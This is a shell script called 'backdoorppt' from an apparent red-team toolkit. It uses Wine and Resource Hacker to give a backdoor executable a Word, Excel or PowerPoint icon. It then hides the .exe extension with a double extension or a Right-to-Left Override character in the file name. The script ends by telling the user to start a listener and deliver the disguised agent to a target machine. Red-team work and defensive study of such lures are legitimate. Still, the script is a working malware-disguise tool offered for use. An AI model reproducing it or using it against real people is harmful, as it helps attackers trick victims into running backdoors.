#!/bin/sh
###
# backdoorppt - a binary transformation tool
# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.4
# Suspicious-Shell-Activity (SSA) RedTeam develop @2017
# codename: strange things happen under windows
#
# [ TOOL DESCRIPTION ]
# This tool Supports wine 32 or 64 bits installations
# Available with 4 icons to change (backdoorppt/icons)
# Available 2 diferent name transformations methods (ruby or bash)
# 1 - Right to Left Override (nameexe.ppt) <-- ruby
# 2 - Hide Extensions for Known File Types (name.ppt.exe) <-- bash
###




# -----------------------------------
# Colorise shell Script output leters
# -----------------------------------
Colors() {
Escape="\033";
  white="${Escape}[0m";
  RedF="${Escape}[31m";
  GreenF="${Escape}[32m";
  YellowF="${Escape}[33m";
  BlueF="${Escape}[34m";
  CyanF="${Escape}[36m";
Reset="${Escape}[0m";
}




# ---------------------
# variable declarations
# ---------------------
VeR="1.4"
ArCh=`arch`
IPATH=`pwd`
HoME=`echo ~`
# Use 2º name transformation method?
tRan=`cat $IPATH/settings | egrep -m 1 "BASH_TRANSFORMATION" | cut -d '=' -f2` > /dev/null 2>&1



# ------------------------
# configuring correct arch
# ------------------------
if [ "$ArCh" = "i686" ]; then
dEd="x86"
arch="wine"
PgFi="Program Files"
else
dEd="x64"
arch="wine64"
PgFi="Program Files (x86)"
fi




# -------------
# Tool banner
# ------------
cat << !

    +-+-+-+-+-+-+-+-+-+-+-+
    |b|a|c|k|d|o|o|r|p|p|t|
    +-+-+-+-+-+-+-+-+-+-+-+
 'A binary transformation tool'
 Credits: Damon Mohammadbagher

!


Colors;
echo ${YellowF}[⊶] Checking backend applications! ${Reset};
sleep 1
# ----------------------
# check for dependencies
# ----------------------
if [ "$tRan" = "YES" ]; then
echo "running default transformation method" > /dev/null 2>&1
else
apc=`which ruby`
if [ "$?" != "0" ]; then
echo ""
echo ${RedF}[☠]${white} Ruby interpreter '->' ${RedF}not found! ${Reset};
echo ${RedF}[☠]${white} This script requires ruby to work! ${Reset};
sleep 1
exit
else
echo ${BlueF}[☆]${white} Ruby installation  '->' ${GreenF}found! ${Reset};
sleep 1
fi
fi

apc=`which wine`
if [ "$?" != "0" ]; then
echo ""
echo ${RedF}[☠]${white} Wine installation '->' ${RedF}not found! ${Reset};
sleep 1
echo ${RedF}[☠]${white} This script requires wine to work! ${Reset};
echo ${RedF}[☠]${white} Please run: sudo apt-get install wine ${Reset};
echo ${RedF}[☠]${white} to install missing dependencies... ${Reset};
exit
else
echo ${BlueF}[☆]${white} Wine installation  '->' ${GreenF}found! ${Reset};
sleep 1
fi

if [ -e "$HoME/.wine/drive_c/$PgFi" ]; then
echo ${BlueF}[☆]${white} Wine ProgramFiles '->' ${GreenF}found! ${Reset};
sleep 1
else
echo ${RedF}[☠]${white} Wine ProgramFiles '->' ${RedF}not found! ${Reset};
echo ${RedF}[☠]${white} $HoME/.wine/drive_c/$PgFi ${Reset};
sleep 1
echo ${RedF}[☠]${white} Please wait, running winecfg! ${Reset};
winecfg > /dev/null 2>&1
sleep 1
exit
fi




# ------------------------
# start of script funtions
# ------------------------
rUn=$(zenity --question --title="☠ BackdoorPPt ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then


# orginal payload full-path variable
UpL=$(zenity --title "☠ PAYLOAD TO BE TRANSFORMED ☠" --filename=$IPATH --file-selection --text "chose payload to be transformed") > /dev/null 2>&1
# icon replacement variable
IcOn=$(zenity --list --title "☠ ICON REPLACEMENT  ☠" --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "MS-Word-32x32.ico" FALSE "MS-Excel-32x32.ico" FALSE "MS-powerpoint-32x32.ico" FALSE "Vector_App.ico" --width 350 --height 260) > /dev/null 2>&1
# input payload outputname
if [ "$tRan" = "YES" ];then
MiP=$(zenity --entry --title "☠ PAYLOAD FINAL NAME ☠" --text "example: curriculum" --width 300) > /dev/null 2>&1
fi


  # wine configurtions (winecfg)
  echo ${BlueF}[☆]${white} Select [${YellowF}windows 7${white}] from winecfg... ${Reset};
cat << !

    The ResourceHacker provided by backdoorppt tool
    requires wine to be set to 'windows 7' version.

!
  sleep 3
  winecfg > /dev/null 2>&1
  sleep 1

    # check for resource hacker installation (wine)
    if [ -f "$HoME/.wine/drive_c/$PgFi/Resource Hacker/ResourceHacker.exe" ]; then
      echo ${BlueF}[☆]${white} ResourceHacker.exe '->' ${GreenF}found! ${Reset};
      sleep 1
    else
      echo ${RedF}[☠]${white} ResourceHacker.exe '->' ${RedF} not found! ${Reset};
      sleep 1
cat << !
    Installing ResourceHacker under .wine directorys... 
    Version:windows7 Arch:$dEd Path:drive_c/$PgFi
    $HoME/.wine/drive_c/$PgFi/Resource Hacker/ResourceHacker.exe

!
      sleep 3
      xterm -T "BackdoorPPt" -geometry 90x26 -e "$arch $IPATH/bin/reshacker_setup.exe && sleep 3"
    fi

      # wine command to call resourcehacker and add a MS-WORD.ico to the backdoor
      echo ${YellowF}[⊶] Working on backdoor agent! ${Reset};
      sleep 1
      echo ${BlueF}[☆]${white} Transforming backdoor agent '->' ${GreenF}done... ${Reset};
      $arch $HoME/.wine/drive_c/"$PgFi"/"Resource Hacker"/ResourceHacker.exe -open $UpL -save $IPATH/output/backdoor.exe -action addskip -res $IPATH/icons/$IcOn -mask ICONGROUP,MAINICON,
      echo ${BlueF}[☆]${white} Change backdoor agent icons '->' ${GreenF}done... ${Reset};
      sleep 1

    # insert .ppt hidden extension
    echo ${BlueF}[☆]${white} Adding agent hidden extensions '->' ${GreenF}done... ${Reset};
    if [ "$tRan" = "YES" ]; then
      mv $IPATH/output/backdoor.exe  $IPATH/output/$MiP.ppt.exe > /dev/null 2>&1
    else
      mv $IPATH/output/backdoor.exe  $IPATH/output/backdoor_ppt.exe > /dev/null 2>&1
    fi

  sleep 1
  cd $IPATH/output
  # rename backdoor name
  echo ${BlueF}[☆]${white} Word doc builder '(backdoorppt)' '->' ${GreenF}done... ${Reset};
  if [ "$tRan" = "YES" ]; then
    echo "bash build" > /dev/null 2>&1
  else
    ruby -e 'File.rename("backdoor_ppt.exe", "resume\xe2\x80\xaetpp.exe")'
  fi
  cd $IPATH
  sleep 1


# -----------------------------
# Display final output to user
# -----------------------------
echo ${YellowF}[⊶] Task over, Writing reports! ${Reset};
sleep 2

if [ "$tRan" = "YES" ]; then
cat << !

    Icon select : $IcOn
    Final file  : $IPATH/output/$MiP.ppt.exe
    Tool Author : r00t-3xp10it (SSA RedTeam)
!

else

cat << !

    Icon select : $IcOn
    Final file  : $IPATH/output/resumeexe.ppt
    Tool Author : r00t-3xp10it (SSA RedTeam)
!
fi

cat << !

    Your backdoor agent its now transformed into one fake
    word doc (ppt) remmenber that .exe extensions will not
    be 'visible' under windows systems, because the system
    default behavior its: NOT show hidden extensions...

    We are now ready to start a handler (listener) and
    deliver the transformed agent to the target machine.

!

# The user dont want to run the tool
# aborted switch..
else
  echo ${RedF}[x]${white} Abort all tasks${RedF}!${Reset};
  sleep 2
fi
# exit
exit
